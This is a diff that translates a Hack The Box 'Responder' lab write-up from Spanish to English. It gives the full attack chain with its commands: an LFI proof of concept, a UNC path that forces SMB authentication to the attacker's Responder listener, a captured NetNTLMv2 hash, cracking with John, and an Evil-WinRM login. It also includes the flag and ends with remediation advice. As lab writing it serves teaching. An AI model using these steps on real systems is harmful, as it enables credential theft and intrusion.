@@ -1,124 +1,100 @@
----
-categories:
-  - "[[Ciber]]"
-tags:
-  - vms
-  - pentesting
-  - starting-point
-  - lfi
-  - ntlm
-  - windows
-created: 2026-04-15
----
-## 1. Información General
+# Responder
 
-- **Máquina:** Responder
-- **IP:** 10.129.79.169
-- **SO:** Windows
-- **Dificultad:** Muy fácil
-- **Fecha:** 15/04/2026
+**Platform:** Hack The Box · **Type:** Starting Point · **OS:** Windows · **Difficulty:** Tier 1
 
-## 2. Resumen Ejecutivo
+**Summary:**
+- A PHP site on Windows had an LFI in an unsanitized URL parameter.
+- PHP still loads SMB paths even with `allow_url_include` off, so I made the server authenticate to my machine over SMB.
+- Responder captured the Administrator's NetNTLMv2 hash and John cracked it offline.
+- With the password, Evil-WinRM gave a remote shell.
 
-Se comprometió un servidor Windows que ejecutaba un sitio PHP vulnerable a Local File Inclusion (LFI) sin sanitización de parámetros URL. Aprovechando que PHP permite cargar URLs SMB incluso con `allow_url_include` desactivado, se forzó al servidor a autenticarse contra nuestra máquina atacante mediante el protocolo SMB. Utilizando [[Responder]] como listener, se capturó el hash NetNTLMv2 del administrador, que fue crackeado offline con John the Ripper. Las credenciales obtenidas permitieron acceso remoto completo al sistema mediante Evil-WinRM.
+## 1. Reconnaissance
 
-## 3. Enumeración (Reconocimiento)
+### 1.1 Port scan
+**Command:** `nmap -sV 10.129.79.169`
 
-### 3.1 Escaneo de Red
+| **Port** | **Service** | **Version**                                            | **State** |
+| -------- | ----------- | ------------------------------------------------------ | --------- |
+| 80       | HTTP        | Apache httpd 2.4.52 (Win64, OpenSSL/1.1.1m, PHP/8.1.1) | Open      |
+| 5985     | HTTP        | Microsoft HTTPAPI httpd 2.0 (WinRM)                    | Open      |
 
-**Comando utilizado:** `nmap -sV 10.129.79.169`
+Port 5985 matters: WinRM is enabled, so valid credentials would mean a remote shell through Evil-WinRM.
 
-| **Puerto** | **Servicio** | **Versión**                                            | **Estado** |
-| ---------- | ------------ | ------------------------------------------------------ | ---------- |
-| 80         | HTTP         | Apache httpd 2.4.52 (Win64, OpenSSL/1.1.1m, PHP/8.1.1) | Abierto    |
-| 5985       | HTTP         | Microsoft HTTPAPI httpd 2.0 (WinRM)                    | Abierto    |
-
-La presencia del puerto 5985 es significativa: indica que WinRM está activo, lo que abre la posibilidad de acceso remoto mediante Evil-WinRM si se obtienen credenciales válidas.
-
-### 3.2 Análisis del Servicio Web
-
-El servidor redirige a `unika.htb`, por lo que fue necesario añadir la entrada correspondiente al archivo `/etc/hosts`:
+### 1.2 Web service
+The server redirects to `unika.htb`, so I added it to `/etc/hosts`:
 
 ```bash
 echo "10.129.79.169    unika.htb" | sudo tee -a /etc/hosts
 ````
 
-![[Pasted image 20260415162605.png]]
+![Pasted image 20260415162605](../../../Attachments/Pasted%20image%2020260415162605.png)
 
-La enumeración de directorios con Gobuster reveló varias rutas, aunque ninguna crítica de forma directa. Lo verdaderamente relevante se encontró inspeccionando la navegación del sitio: el parámetro `?page=` en la URL carga dinámicamente distintas versiones de la página (`french.html`, `german.html`, etc.), y no aplica ningún tipo de sanitización sobre la entrada del usuario.
+Gobuster found a few paths, none of them critical on their own:
 
 ```bash
 gobuster dir -u 10.129.79.169 --wordlist "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"
 ```
 
-![[Pasted image 20260415162803.png]]
+![Pasted image 20260415162803](../../../Attachments/Pasted%20image%2020260415162803.png)
 
-## 4. Análisis de Vulnerabilidades
+The interesting part came from browsing the site. The `?page=` parameter loads different language versions (`french.html`, `german.html`, etc.) and does no sanitization on the input.
 
-### 4.1 Local File Inclusion (LFI)
+## 2. Foothold
 
-El parámetro `?page=` utiliza el método `include()` de PHP para servir contenido sin validar la ruta proporcionada. Esto permite a un atacante referenciar rutas arbitrarias del sistema de archivos del servidor.
+### 2.1 Local File Inclusion
+`?page=` passes the path to PHP's `include()` without validating it, so it can reference arbitrary files on the server.
 
-**Prueba de concepto:**
-
+Proof of concept:
 ```
 http://unika.htb/?page=../../../../windows/system32/drivers/etc/hosts
 ```
 
-La respuesta confirmó que el servidor devuelve el contenido del archivo `hosts` de Windows, validando la vulnerabilidad LFI.
+The response contains the Windows `hosts` file, which confirms the LFI.
 
-![[Pasted image 20260415163145.png]]
+![Pasted image 20260415163145](../../../Attachments/Pasted%20image%2020260415163145.png)
 
-### 4.2 Captura de Hash NetNTLMv2 mediante SMB
+### 2.2 Capturing a NetNTLMv2 hash over SMB
+`allow_url_include` is disabled in `php.ini`, but PHP still allows SMB paths. If the page parameter points to a UNC path on my machine, the Windows server tries to authenticate with NTLM. That exposes the NetNTLMv2 hash of the account running the web server.
 
-Aunque la directiva `allow_url_include` esté desactivada en `php.ini`, PHP no impide la carga de URLs con el protocolo SMB. Esto significa que se puede referenciar una ruta UNC apuntando a nuestra máquina atacante: el servidor Windows intentará autenticarse mediante el protocolo NTLM, exponiendo el hash NetNTLMv2 del usuario que ejecuta el servicio web.
+NTLM is challenge-response: the server sends a random challenge, the client encrypts it with its password hash and sends the result back. That response (NetNTLMv2) can be captured and cracked offline.
 
-**Flujo del ataque:**
-
-El protocolo NTLM utiliza un mecanismo de desafío-respuesta: el servidor genera un desafío aleatorio, el cliente lo cifra con el hash de su contraseña y devuelve la respuesta. Esta respuesta (el NetNTLMv2) puede capturarse y atacarse offline con herramientas de cracking.
-
-## 5. Explotación
-
-### 5.1 Captura del Hash con [[Responder]]
-
-Se levantó [[Responder]] escuchando en la interfaz VPN (`tun0`) para simular un servidor SMB legítimo:
+I started Responder on the VPN interface (`tun0`) to act as an SMB server:
 
 ```bash
-sudo [[Responder|responder]] -I tun0
+sudo responder -I tun0
 ```
 
-Paralelamente, se envió la siguiente petición desde el navegador, referenciando una ruta UNC hacia nuestra IP de atacante:
+Then I requested a UNC path pointing at my IP:
 
 ```
 http://unika.htb/?page=//10.10.16.225/whatever
 ```
 
-El servidor intentó autenticarse contra nuestro listener SMB, y [[Responder]] capturó el hash NetNTLMv2:
+The server authenticated against the listener and Responder captured the hash:
 
 ```
-[SMB] NTLMv2-SSP Username : [[Responder|RESPONDER]]\Administrator
-[SMB] NTLMv2-SSP Hash     : Administrator::[[Responder|RESPONDER]]:4198d1d8a1688c5e:A0FA6A874359EE98A4536357517D5934:0101...
+[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
+[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:4198d1d8a1688c5e:A0FA6A874359EE98A4536357517D5934:0101...
 ```
 
-### 5.2 Cracking del Hash con John the Ripper
-
-El hash capturado se almacenó en un fichero (`hash.txt`) y se atacó con el diccionario `rockyou.txt`:
+### 2.3 Cracking with John the Ripper
+I saved the hash to `hash.txt` and ran it against `rockyou.txt`:
 
 ```bash
 john -w=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 
-**Resultado:** La contraseña del administrador es `badminton`, obtenida en menos de un segundo.
+The Administrator password is `badminton`; it cracked in under a second.
 
-### 5.3 Acceso Remoto con Evil-WinRM
+## 3. Privilege Escalation
 
-Con las credenciales en claro, se estableció una sesión remota interactiva mediante WinRM:
+No separate escalation step: the cracked hash already belongs to `Administrator`.
 
 ```bash
 evil-winrm -i 10.129.79.169 -u administrator -p badminton
 ```
 
-Desde la sesión obtenida, se localizó la flag en el escritorio del usuario `mike`:
+From that session, the flag is on `mike`'s desktop:
 
 ```powershell
 type ..\..\mike\Desktop\flag.txt
@@ -126,10 +102,14 @@ type ..\..\mike\Desktop\flag.txt
 
 **Flag:** `ea81b7afddd03efaa0945333ed147fac`
 
-## 6. Remediación y Conclusiones
+## 4. Conclusion
 
-- **Criticidad:** Alta
+**Severity:** High
 
-La cadena de ataque completa — desde la LFI hasta la toma de control del sistema — es completamente evitable aplicando las siguientes medidas.
+**Chain:** LFI in `?page=` → forced SMB authentication → NetNTLMv2 capture → offline crack → WinRM as Administrator.
 
-En primer lugar, la vulnerabilidad LFI se elimina validando y saneando cualquier parámetro que controle la carga de ficheros, utilizando una lista blanca de valores permitidos en lugar de pasar la entrada del usuario directamente a `include()`. En segundo lugar, aunque PHP no bloquee URLs SMB por defecto, la carga de recursos externos mediante `include()` debería restringirse estrictamente al sistema de archivos local, y el servidor web debería ejecutarse con una cuenta de servicio de mínimos privilegios para limitar la exposición de credenciales. Por último, la contraseña del administrador (`badminton`) es trivialmente débil; la implementación de una política de contraseñas robustas y el uso de autenticación multifactor para accesos remotos habría impedido el cracking incluso si el hash hubiera sido capturado.
+Every step was avoidable:
+- **Fix the LFI:** validate any parameter that controls file loading against an allowlist instead of passing user input to `include()`.
+- **Limit what `include()` can reach:** restrict it to the local filesystem.
+- **Run the web server with low privileges:** use a least-privilege service account, so a leaked hash isn't an admin's.
+- **Use strong passwords:** `badminton` is trivially weak. A strong password policy plus MFA for remote access would have stopped the crack even after the hash leaked.
